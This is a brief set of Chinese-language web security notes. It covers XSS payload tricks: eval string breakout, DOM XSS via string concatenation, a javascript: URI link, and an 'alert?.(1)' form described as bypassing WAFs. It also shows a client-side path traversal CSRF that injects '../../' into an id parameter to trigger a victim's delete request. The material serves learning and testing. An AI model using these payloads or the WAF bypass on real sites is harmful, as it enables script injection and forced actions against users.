```JavaScript
eval("console.log('"+"')-alert()//"+"')");
注释只会注释当前部分，不会全部注释掉，就是最后一个双引号之前的会注释掉
```
危险函数：settimeout，eval，location，innerhtml等

```
var name = '1' -alert(1)
典型的domxss
```

```
<a href=javascript:alert%28%29>test</a>
```

```
alert?.(1)
可以绕waf
```

CSRF的客户端路径穿越
/api/user/del/info?id=fever
可能造成的后端请求是
/api/user/del/info/id/fever
那么我们可以
```
/api/user/del/info?id=../../fever
```
造成受害者发送这样的请求，会带上自己的csrftoken
```
/api/user/del/fever
```
这是发生在客户端的